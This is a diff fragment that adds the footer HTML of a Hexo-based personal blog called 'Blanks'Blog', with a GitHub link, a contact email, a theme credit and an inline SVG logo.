+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
